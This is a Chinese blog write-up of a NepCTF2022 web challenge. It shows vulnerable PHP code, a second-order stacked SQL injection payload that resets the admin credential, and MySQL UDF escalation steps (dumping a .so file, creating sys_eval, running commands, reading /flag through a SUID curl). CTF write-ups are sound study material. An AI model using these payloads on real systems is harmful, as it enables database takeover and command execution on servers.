<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#000000"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>NepCTF2022博学多闻的花花WP&amp;出题笔记 | Err0r的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
  [".post-card",".markdown-body img",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#000000"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"浅伴独蓝的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"想要搜些什么？","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false,"src":"/js/search/local-search.js"},"waline":{"config":{"enable":true,"serverURL":"https://comments-err0rcm.vercel.app","comment":true,"visitor":false,"emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Err0r的小站" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="NepCTF2022 Web题·博学多闻的花花 WP&amp;出题笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="NepCTF2022博学多闻的花花WP&amp;出题笔记">
<meta property="og:url" content="https://err0r.top/article/eruditeFlower/index.html">
<meta property="og:site_name" content="Err0r的小站">
<meta property="og:description" content="NepCTF2022 Web题·博学多闻的花花 WP&amp;出题笔记">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718201604798.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718201827284.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718203220152.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718194746609.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718194810642.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718194821729.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221007121541949.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221007122036015.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111447545.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111513524.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111744267.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111802999.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111910450.png">
<meta property="article:published_time" content="2022-07-18T11:41:52.000Z">
<meta property="article:modified_time" content="2023-02-15T10:57:00.352Z">
<meta property="article:author" content="Err0r">
<meta property="article:tag" content="blog">
<meta property="article:tag" content="博客">
<meta property="article:tag" content="Err0r">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://err0r.top/article/eruditeFlower/image-20220718201604798.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0r的小站</a><sub class="site-subtitle">gyy</sub><div class="site-description">学的越多，越觉得自己渺小</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">43</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ MTkwNjk2ODc2NA==" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Err0rCM" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/8408670" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:err0rcm@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link/" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-send-plane-2-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们|友情链接" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write-Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96admin"><span class="toc-number">2.1.</span> <span class="toc-text">二次+堆叠注入获取admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5-so%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.2.</span> <span class="toc-text">写入.so文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAudf"><span class="toc-number">2.2.3.</span> <span class="toc-text">创建udf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.4.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.3.</span> <span class="toc-text">最终步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">分析网站流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#register"><span class="toc-number">3.1.1.</span> <span class="toc-text">register</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#login"><span class="toc-number">3.1.2.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#index"><span class="toc-number">3.1.3.</span> <span class="toc-text">index</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#score"><span class="toc-number">3.1.4.</span> <span class="toc-text">score</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%A9%E4%B8%8B%E7%9A%84%E7%BD%91%E9%A1%B5-amp-%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.5.</span> <span class="toc-text">剩下的网页 &amp; 接下来的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#config"><span class="toc-number">3.1.5.1.</span> <span class="toc-text">config</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#logout"><span class="toc-number">3.1.5.2.</span> <span class="toc-text">logout</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rank"><span class="toc-number">3.1.5.3.</span> <span class="toc-text">rank</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.5.4.</span> <span class="toc-text">接下来的思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%90%BD%E5%9C%B0-so%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.6.</span> <span class="toc-text">落地.so文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAudf-amp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.1.7.</span> <span class="toc-text">创建udf &amp; 命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.8.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.9.</span> <span class="toc-text">小提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.10.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q-amp-A"><span class="toc-number">4.</span> <span class="toc-text">Q&amp;A</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">中文乱码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-x3D-%E4%B8%8E-x3D-x3D-%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.2.</span> <span class="toc-text">&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#admin%E7%99%BB%E5%BD%95%E4%B8%8A%E8%BD%A6%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.</span> <span class="toc-text">admin登录上车的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%83%E9%99%90%E9%85%8D%E7%BB%99"><span class="toc-number">4.4.</span> <span class="toc-text">题目权限配给</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%9D%83%E9%99%90%E4%B8%8E%E8%A2%AB%E6%90%85shi%E5%90%8E%E7%9A%84%E4%BF%AE%E6%94%B9"><span class="toc-number">4.4.1.</span> <span class="toc-text">数据库的权限与被搅shi后的修改</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#challengesAll"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">challengesAll</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#randChallenges"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">randChallenges</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#score-1"><span class="toc-number">4.4.1.3.</span> <span class="toc-text">score</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#userAnswer"><span class="toc-number">4.4.1.4.</span> <span class="toc-text">userAnswer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#users"><span class="toc-number">4.4.1.5.</span> <span class="toc-text">users</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ctf"><span class="toc-number">4.4.1.6.</span> <span class="toc-text">ctf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.4.1.7.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%90%85%F0%9F%92%A9%E7%9A%84%E7%8A%B6%E5%86%B5"><span class="toc-number">4.4.2.</span> <span class="toc-text">比赛中出现搅💩的状况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%8E%AA%E6%96%BD"><span class="toc-number">4.4.2.1.</span> <span class="toc-text">临时措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A2%AB%E7%88%86%E7%A0%B4"><span class="toc-number">4.5.</span> <span class="toc-text">题目被爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%87%8D%E7%BD%AE"><span class="toc-number">4.6.</span> <span class="toc-text">题目重置</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#000000;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/eruditeFlower/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">NepCTF2022博学多闻的花花WP&amp;出题笔记</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-07-18 19:41:52" itemprop="dateCreated datePublished" datetime="2022-07-18T19:41:52+08:00">2022-07-18</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2023-02-15 18:57:00" itemprop="dateModified" datetime="2023-02-15T18:57:00+08:00">2023-02-15</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">5.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">24m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/article/eruditeFlower/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Write-Up/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Write-Up</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>NepCTF2022 Web题·博学多闻的花花 WP&amp;出题笔记</p>
<span id="more"></span>

<p>我先摆个链接，诶 被坏女人催写wp，先挖个坑在这啦 <a href="https://err0r.top/article/eruditeFlower/">https://err0r.top/article/eruditeFlower/</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这道题目的原型是我的动态Web课设，随随便便撸了个课设，然后NepCTF开始筹备了，在写数据库操作的时候发现像这样一个动态抽取题目答题的网站，如果安全没做好的话肯定一堆漏洞(<del>事实上课设最后答辩我看了下全是漏洞，但毕竟只是一个开发的课设</del>)。联想到国内近一年来的ctf题目，很少有考到二次注入的，因为大多数的情况下采用的是限制性原则，即过滤&#x2F;匹配替换等限制字符串，并没有转义字符这样的操作，恰恰就是因为这样做如果没有限制好参数就会产生二次注入的漏洞，我将这点和课设中multi_query操作进行结合，再加上ctf中更加罕见的udf提权操作，出了一道题目，希望师傅们能理解其中的意义。</p>
<p>前排指路：</p>
<p><a href="#exp">exp</a></p>
<p>如果不想看wp想看我吹水的可以看<a href="#Q&A">Q&amp;A</a></p>
<p>包括一些避免搅shi，出题时遇到的问题和反作弊对抗的事情，凡事总有第一次，希望能给后面出题的师傅们一些帮助</p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write-Up"></a>Write-Up</h2><h3 id="二次-堆叠注入获取admin"><a href="#二次-堆叠注入获取admin" class="headerlink" title="二次+堆叠注入获取admin"></a>二次+堆叠注入获取admin</h3><p>根据源码在<code>login.php</code>的28-30行，用户登录后session存储了<code>username</code>和<code>studentid</code>的源数据</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>之后在<code>index.php</code>的183-184行可以看到在存储用户答案的时候，没有对传入的参数(<code>$_SESSION[&#39;username&#39;]</code>)进行过滤</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into score values (NULL, '"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"', <span class="token interpolation"><span class="token variable">$getscroe</span></span>);
insert into userAnswer values (NULL, '"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q2'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q3'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q4'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q5'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"')"</span><span class="token punctuation">;</span></code></pre>

<p>这里由于一点点小问题导致没有对q1-5进行合法性验证，所以导致在这里即可直接使用堆叠注入进行下一步操作，这里的考点是二次注入，利用<code>username</code>进行堆叠注入，修改admin的<code>studentid</code>，从而登录获取admin。由于增加revenge会导致原有分数结构被破坏<del>(咱就是个新生赛)</del>，因此比赛过程中就没有对题目做修改啦。</p>
<p><strong>现题目已经修改完毕，增加了对q1-5的合法性验证，无法在q1-5处进行注入了，附件也将会同步更新。</strong></p>
<p>因为通篇来看，只有这处未对<code>username</code>转义，而且此处进行了<code>multi_query</code>，所以可以如果此处存在注入点的话就可以进行堆叠注入。</p>
<p>首先尝试闭合，可以看到如果我的username为</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;1&#39;);update users set studentid&#x3D;&#39;&#123;passwd&#125;&#39; where username&#x3D;&#39;admin&#39;;</code></pre>

<p>那么执行的sql语句就变成了这样</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">...;insert into userAnswer values (NULL, &#39;a&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;1&#39;);update users set studentid&#x3D;&#39;admin_passwd&#39; where username&#x3D;&#39;admin&#39;;#&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;)&quot;;</code></pre>

<p>执行后就更改了admin的<code>studentid</code>为<code>admin_passwd</code>，就可以登录到<code>score.php</code>了。</p>
<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>根据附件<code>init.sql</code>，ctf用户拥有<code>*.*</code>的<code>file</code>和<code>insert</code>权限</p>
<img src="/article/eruditeFlower/image-20220718201604798.png" class="" title="image-20220718201604798" loading="lazy">

<p>(这里score库的权限配给进行过修改，原因是有人搞事，这个会在后面的出题笔记中细说)</p>
<p>同时根据附件给的<code>my.cnf</code>，配置文件都是默认配置，且<code>secure-file-priv</code>直接给到了plugin目录下</p>
<img src="/article/eruditeFlower/image-20220718201827284.png" class="" title="image-20220718201827284" loading="lazy">

<p>且<code>init.sql</code>的<code>score.ctf</code>表也写明了<code>flag_in_/flag</code>，要么通过读取文件的方式将flag读入获取，要么udf提权，操作系统函数。</p>
<h4 id="写入-so文件"><a href="#写入-so文件" class="headerlink" title="写入.so文件"></a>写入.so文件</h4><p>由于服务器是linux-x64，在github选取合适的.so文件或者自己编译，本地使用select获取其hex值。</p>
<p><code>select hex(load_file(&#39;/usr/lib64/mysql/plugin/exp.so&#39;))</code>得到值如下</p>
<pre class="language-hex" data-language="hex"><code class="language-hex">0x7F454C460201...</code></pre>

<p>太长了，exp里有写，这里就不再展示了</p>
<p>在<code>score.php</code>的54-55行，由于本页面对admin开放，所以没有进行可信验证，直接存在注入。</p>
<p>同样利用二次注入，先闭合后使用dump file写入.so文件</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;select &lt;0x7F...&gt; into dumpfile &#39;&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin&#x2F;exp.so&#39;;#</code></pre>

<h4 id="创建udf"><a href="#创建udf" class="headerlink" title="创建udf"></a>创建udf</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;exp.so&#39;;#</code></pre>

<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">aaa&#39;;select sys_eval(&#39;id&#39;);#</code></pre>

<h3 id="最终步骤"><a href="#最终步骤" class="headerlink" title="最终步骤"></a>最终步骤</h3><p>这里直接弹个shell回来，直接<code>cat /flag</code>，没有权限，寻找有suid位的程序curl，执行<code>curl file:///flag</code>获得flag</p>
<img src="/article/eruditeFlower/image-20220718203220152.png" class="" title="image-20220718203220152" loading="lazy">





<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="分析网站流程"><a href="#分析网站流程" class="headerlink" title="分析网站流程"></a>分析网站流程</h3><p>首先打开是主界面(index.php)，有注册(register.php)，登录(login.php)，查询(score.php)和排名(rank.php)四个界面。</p>
<img src="/article/eruditeFlower/image-20220718194746609.png" class="" title="image-20220718194746609" loading="lazy">

<p>注册和登录都非常的朴实无华，没啥好说的</p>
